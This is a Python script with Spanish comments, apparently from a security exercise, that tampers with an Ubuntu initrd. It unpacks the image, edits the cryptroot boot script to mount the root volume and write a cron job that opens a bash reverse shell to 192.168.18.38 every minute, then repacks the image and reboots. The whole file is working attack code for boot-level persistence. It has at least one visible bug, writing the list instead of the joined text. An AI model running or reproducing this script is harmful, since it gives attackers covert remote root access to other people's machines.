import subprocess
import os
import sys
import glob
# Libreria para Debug
import pdb;pdb.set_trace()

if os.getuid():
    sys.exit("Please run as root")

# Lista de comandos para ejecutar en terminal
scripts = [
    # Se da uso de la libreria dd para la extraccion de datos del archivo init, if=archivo fuente, bs=Block size para saber cuanta informacion se lee, 
    # count=Cantidad de bloques de datos se copian(En este caso 1838080/512=3590), of=Archivo destino
    "dd if=/boot/initrd.img-4.15.0-45-generic bs=512 count=3590 of=/boot/initrd.microcode",
    # skip=Para saltar/ignorar el primer byte por que ya esta incluido en el archivo anterior.
    "dd if=/boot/initrd.img-4.15.0-45-generic bs=1838080 skip=1 of=/boot/image",
    # Se crea nuevo directorio /boot/copyinit
    "mkdir /boot/copyinit",
    # Se mueve image al nuevo directorio
    "mv /boot/image /boot/copyinit/",
    # Se utiliza zcat para extrar el contenido del arhivo CPIO. -id se lee como -i=modo extraccion, -d=crear directorios, si es necesario.
    "zcat image | cpio -id",
    # Se elimina image del directorio
    "rm /boot/copyinit/image"
]

contains = "zcat"
# Loop para ir ejecutando los comandos en terminal
for script in scripts:
    if contains in script:
        # cwd=Indica el directorio en el cual se va ejecutar el comando, si no esta definido, se asume que no es necesario.
        subprocess.run(script, shell=True, check=True, cwd="/boot/copyinit/")
    else:
        subprocess.run(script, shell=True, check=True)

# Se lee el archivo cryptroot
with open('/boot/copyinit/scripts/local-top/cryptroot', 'r') as file:
    lines = file.readlines()

# Se elimina la ultima linea del archivo
if lines:
    lines = lines[:-1]

# Lista de nuevas lineas para agregar en el archivo
new_lines = [
    # Se "monta" una filesystem, donde la fuente seria el "root"(/dev/mapper/ubuntu--vg-root) en /tmp
    "mount /dev/mapper/ubuntu--vg-root /tmp\n",
    # Linea del reserve shell que se agrega al archivo crontab para que se ejecute cada minuto (* * * * *)
    "echo -e \"* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/192.168.18.38/80 0>&1'\" >> /tmp/etc/crontab\n",
    # Se desmonta el filesystem /tmp
    "umount /tmp\n",
    # Ultima linea del cryptroot
    "exit 0"
]
# Se agregan las lineas a lines(total leido)
lines.extend(new_lines)

# Se abre el archivo en modo escritura y se agregan las nuevas lineas.
with open('/boot/copyinit/scripts/local-top/cryptroot', 'w') as file:
    # Se agregan las lineas a un str por medio de .join()
    text = ''.join(lines)
    file.write(lines)

# Lista de comandos para ejecutar en terminal
scripts = [
    # find .:Busca todos los directorios, cpio -H newc -o:Se crea nuevo archivo CPIO del resultado del find . anterior por medio del |. gzip -9: Se comprime el resultado con el maximo nivel(9).
    "find . | cpio -H newc -o | gzip -9 > packedImage",
    # Se mueve el achivo packedImage al directorio /boot/
    "mv /boot/copyinit/packedImage /boot/packedImage",
    # Se utiliza cat para "concatenar" o unir los archivos mencionados para crear uno nuevo (initrd.img-4.15.0-45-generic)
    "cat initrd.microcode packedImage > initrd.img-4.15.0-45-generic",
    # Se reinicia la maquina
    "sudo reboot"
]

containsFind = "find"
containsCat = "cat"
# Loop para ir ejecutando los comandos en terminal
for script in scripts:
    if containsFind in script:
        #cwd=Indica el directorio en el cual se va ejecutar el comando, si no esta definido, se asume que no es necesario.
        subprocess.run(script, shell=True, check=True, cwd="/boot/copyinit/")
    elif containsCat in script:
        subprocess.run(script, shell=True, check=True, cwd="/boot/")
    else:
        subprocess.run(script, shell=True, check=True)